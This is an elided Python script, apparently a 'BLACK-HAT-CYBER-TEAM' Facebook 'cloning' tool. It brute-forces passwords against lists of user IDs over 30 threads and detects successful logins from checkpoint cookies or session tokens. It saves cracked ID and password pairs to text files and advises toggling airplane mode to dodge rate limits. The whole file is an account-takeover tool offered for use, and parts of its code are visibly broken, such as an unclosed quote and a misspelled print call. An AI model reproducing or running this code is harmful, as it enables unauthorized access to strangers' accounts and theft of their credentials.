...
def crack(idf,pwv):
	...
	sys.stdout.write('\r %s[RABBI] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;91m [RABBI-CP] {idf} * {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/RABBI-CP.txt','a').write('%s\n' % wrt)
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;92m [Successful-RABBI] {idf} * {pw}')
				...
				print(f'\r\x1b[1;92m [Successful-RABBI] {idf} * {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/Successful-RABBI.txt','a').write('%s\n' % wrt)
...
def follow(ses,coki):
	...
	r = sop(ses.get('https://www.facebook.com/profile.php?id=100072425385396', cookies={'cookie': coki}).text, 'html.parser')
...
\033[1;32m===============================================================
\033[1;32m[-]\033[1;32mTOOLS     :\033[1;32m Old-2009 CLONING
\033[1;32m[-]\033[1;32mVERSION   :\033[1;32m Personal
\033[1;32m[-]\033[1;32mAUTHOR    :\033[1;32m RABBI404
\033[1;32m[-]\033[1;32mGITHUB    :\033[1;32m RABBI404
\033[1;32m[-]\033[1;32mTEAM      :\033[1;32m BLACK-HAT-CYBER-TEAM 
\033[1;32m===============================================================
'\033[1;32mTurn on & off flight (airplane) mode before use   
\033[1;32m==============================================================="""
...
class Main:
	...
	def __init__(self):
		...
		print("\033[1;32mNote : \33[1;32m\33[1;32mApprove korte first follow my fb account\33[0m")

		print("══════════════════════════════════════════════════")

		print("══════════════════════════════════════════════════")

		print("\033[1;32m  |1| \33[1;37mFOLLOW MY FACEBOOK ACCOUNT ")

		print("\033[1;32m  |2| \33[1;37m𝗖𝗹𝗼𝘀𝗲 ")
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/profile.php?id=100072425385396m')

			print("══════════════════════════════════════════════════")

			time.sleep(3.0)

			print("\033[1;32m    CHECHKING PLEASE WAIT ")

			print("══════════════════════════════════════════════════")

			input("\n\033[1;32m ACCOUNT NAME :  \033[1;32m")
		...
		print(" \033[1;32m[1]\033[1;32m CRACK FILE")

		print(" \033[1;32m[2] CRACK PUBLICK ID")

		print(" \33[1;32m[3] PAK RANDOM CLONING")

		print(" \033[1;32m[4] 2004 TO 2010[OPEN]")

		print(" \33[1;32m[5] 2011 TO 2020 ")
	...
	def old(self):
		...
		limit = int(input(" \n\033[1;32m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 50,000: "))
		...
		try:
			...
			print("\033[1;32m [+] TOTAL ID -> \033[1;32m%s\033[1;32m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;32m ")
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[1;32m%s\033[1;32m]"%(G,listpass))
				...
				print("\n\033[1;32m [+] ERROR-X5 HAS BEEN START")

				print(" \033[1;32m[+] Note: CP AC OPEN 70% JUST NOW")
			...
			exit("\n\n \033[1;32m>>[PROCESS COMPLETE... \n\033[1;32m >>[THANKS FOR USING MY TOOL...")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]%s> /[RABBI]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-RABBI]%s | %s\033[1;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("Successful-RABBI.txt","a").write(" %s|%s\n"%(uid, pw))
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n\033[0;97m [+] ERROR-X5 HAS BEEN START")

				print(" \033[0;97m[+] Note: Cp Ac Open 70% just now")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-RABBI] %s | %s\033[0;32m         "%(uid, pw))
